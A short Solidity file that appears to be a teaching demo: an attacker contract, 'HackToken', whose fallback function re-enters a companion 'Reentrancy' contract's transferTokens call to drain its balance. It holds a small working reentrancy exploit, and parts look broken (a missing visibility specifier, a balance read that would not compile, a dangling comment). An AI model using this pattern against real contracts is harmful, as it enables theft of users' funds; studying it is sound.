pragma solidity ^0.5.2;


import "./Reentrancy.sol";
/// @author Balaji Pachai
/// @title HackToken
/// @dev A contract that pull in all the tokens from the Reentrancy contract
contract HackToken {
    Reentrancy public rentrancyAddress;

    /// @title Constructor
    /// @dev constructor that sets the Reentrancy contract address
    constructor (address rentrancyContractAddress) public {
        rentrancyAddress = Reentrancy(rentrancyContractAddress);
    }

    /// @title deposit
    /// @dev Function that deposits tokens into the Reentrancy contract
    function deposit(uint256 noOfTokens) public {
        rentrancyAddress.depositTokens(noOfTokens);
    }

    /// @title transfer
    /// @dev Function that invokes re-entrancy transferTokens function
    function transfer() payable {
        rentrancyAddress.transferTokens(1 ether);
    }

    /// @title pullInTokens
    /// @dev Function that pulls in tokens from

    function() external payable { 
        if (rentrancyAddress.balance > 0 ) {
            rentrancyAddress.transferTokens(1 ether);
        }
    }
}

